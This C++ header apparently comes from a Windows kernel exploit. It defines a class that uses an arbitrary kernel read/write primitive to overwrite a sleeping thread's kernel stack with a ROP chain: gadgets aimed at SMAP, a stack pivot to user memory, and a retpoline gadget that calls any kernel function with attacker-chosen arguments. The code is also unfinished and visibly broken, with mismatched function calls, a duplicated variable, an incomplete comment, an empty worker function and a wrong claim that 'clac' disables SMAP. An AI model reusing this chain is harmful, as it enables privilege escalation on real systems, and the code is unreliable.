#pragma once

#include "Resolves.h"

#include <queue>
#include <functional>

extern HANDLE g_NotifyCall;
extern HANDLE g_WaitForCallEnd;

extern "C"
NTSTATUS NtSignalAndWaitForSingleObject(
	HANDLE ObjectToSignal,
	HANDLE ObjectToWaitOn,
	bool Aleratable,
	DWORD Timeout
);

extern "C"
NTSTATUS NtWaitForSingleObject(
	HANDLE Object,
	bool Aleratable,
	DWORD Timeout
);

constexpr ULONG c_TrapFrameSize = 0x190;

class KInvoker 
{

	static kAddress GetNtWaitForSingleObjectReturnAddress(kAddress CallingThread, kAddress& )
	{
		//
		// We target the last return address before returning to UserMode. The call stack after
		// calling NtWaitForSingleObject is something like the following:
		// - nt!NtWaitForSingleObject
		// - nt!KiSystemServiceCopyEnd+0x25
		// - ntdll!NtWaitForSingleObject
		//
		// Note that we're switching to UM stack after KiSystemServiceCopyEnd, hence it makes sense to target it.
		// We'll start scanning from the initial stack 
		//

		constexpr ULONG c_InitialStackOffset = 0x28;
		kAddress initialStack = g_Rw->ReadQword(CallingThread + c_InitialStackOffset);

		kAddress returnAddress = g_Rw->ReadQword(initialStack - c_TrapFrameSize - sizeof(kAddress));
		return returnAddress;
	}

	template <typename... Args>
	static void OverrideThreadStackWithFunctionCall(
		_In_ kAddress Function,
		_In_ kAddress CallingThread,
		_Inout_ Qword* ReturnValue,
		_In_ std::tuple<Args...>&& Arguments
	) {

		kAddress rsp = GetNtWaitForSingleObjectReturnAddress(CallingThread);

		//
		// Read previous trap frame & for later restoration
		//
		std::vector<Byte> previousStackData = g_Rw->ReadBuffer(rsp + 8, c_TrapFrameSize + 8);

		
		constexpr DWORD c_KernelStackSize = 12 * 0x1000;

		// we add another page for our gadgets' shenanigens
		constexpr DWORD c_PivotedStackSize = c_KernelStackSize + 0x1000;
		thread_local Byte* newStack = VirtualAlloc(nullptr, c_KernelStackSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

		auto* stackTop = newStack + c_KernelStackSize;
		
#define PUT_STACK(val) g_Rw->WriteQword(rsp, val); rsp += 8;

		//
		// Disable SMAP so we could pivot into user stack. Recall the gadget is
		// 
		//	.text:00000001403363B4                 clac
		//	.text:00000001403363B7                 add     rsp, 0C8h
		//	.text:00000001403363BE                 pop     r14
		//	.text:00000001403363C0                 pop     rsi
		//	.text:00000001403363C1                 pop     rbx
		//	.text:00000001403363C2                 pop     rbp
		//	.text:00000001403363C3                 retn
		// 
		// Note: might come later to fuck us :(
		//

		PUT_STACK(s_Gadgets.DisableSmap);
		
		rsp += 0xc8;
		PUT_STACK(0x41); // pop r14
		PUT_STACK(0x41); // pop rsi
		PUT_STACK(0x41); // pop rbx
		PUT_STACK(0x41); // pop rbx

		// Our pivot gadget uses rbp as the new stack pointer
		PUT_STACK(newStack + c_KernelStackSize); // pop rbp

		//
		// Pivot gadget. Recall that it looks as follows:
		//
		// KiPlatformSwapStacksAndCallReturn:
		//	.text:000000014041F60F                 mov     rsp, rbp
		//	.text:000000014041F612                 pop     rbp
		//	.text:000000014041F613                 retn
		//

		PUT_STACK(s_Gadgets.StackPivot);
		
		//
		// Note: We've now switched to usermode stack.
		//

		rsp = stackTop;

#undef PUT_STACK
#define PUT_STACK(val) *(Qword*)(rsp)++ = Qword(val);

		PUT_STACK(0x1337);	// pop rbp

		//
		// We'll use the retpoline gadget. Recall it looks as follows:
		//
		// __guard_retpoline_exit_indirect_rax:
		//  ...
		//	mov rax, [rsp+0x20]
		//	mov rcx, [rsp+0x28]
		//	mov rdx, [rsp+0x30]
		//	mov r8,  [rsp+0x38]
		//	mov r9,  [rsp+0x40]
		//	add rsp, 0x48
		//  jmp rax
		//

		PUT_STACK(s_RetpolineGadget);

		rsp += 0x20;

		// add jump target: Function
		PUT_STACK(Function);
		auto* beforeArgsRsp = rsp;
		
		// add register arguments
		constexpr auto NumberOfArguments = std::size(Arguments);

		if constexpr (NumberOfArguments >= 1) PUT_STACK(std::get<0>(Arguments));
		if constexpr (NumberOfArguments >= 2) PUT_STACK(std::get<1>(Arguments));
		if constexpr (NumberOfArguments >= 3) PUT_STACK(std::get<2>(Arguments));
		if constexpr (NumberOfArguments >= 4) PUT_STACK(std::get<3>(Arguments));

		// update rsp to after add rsp, 0x48
		rsp = beforeArgsRsp + 0x28;

		// add remaining stack arguments
		
		rsp += 0x20; // save shadow space

		if constexpr (NumberOfArguments >= 5) {
			auto indiciesOfRemainingArgs = std::make_index_sequence<NumberOfArguments - 4>{};
			Qword remaining[] = { Qword(std::get<indiciesOfRemainingArgs>(Arguments))... };
			std::memcpy(rsp, remaining, sizeof(remaining));

			rsp += sizeof(remaining);
		}

		// go back to where we've been - and return to user mode lol
		
		std::memcpy(rsp, previousStackData.data(), previousStackData.size());
	}

	/*
	Kernel callbacks: we'll put
	
	*/

public:
	template <typename... Args>
	Qword CallKernelFunction(
		kAddress Function,
		Args... Arguments) 
	{
		auto args = std::make_tuple(std::forward<Args>(Arguments)...);
		HANDLE event = CreateEventA(nullptr, true, false, nullptr);
		DWORD currentTid = GetCurrentThreadId();
		Qword returnValue = 0;

		m_TaskQueue.push([args, event, Function, currentTid, &returnValue]
			{
				kAddress thread = Resolves::GetThreadAddress(currentTid);
				OverrideThreadStackWithFunctionCall(Function, thread, &returnValue, args);
				SetEvent(event);
			});

		auto returnValue = Qword(NtWaitForSingleObject(event, false, INFINITE));
		return returnValue;
	}

private:
	std::queue<std::function<void()>> m_TaskQueue;

	static struct {
		kAddress Retpoline;
		kAddress StackPivot;
		kAddress PopRbp;
		kAddress DisableSmap;
	} s_Gadgets;
};



void WorkerThread(PVOID Context) {

}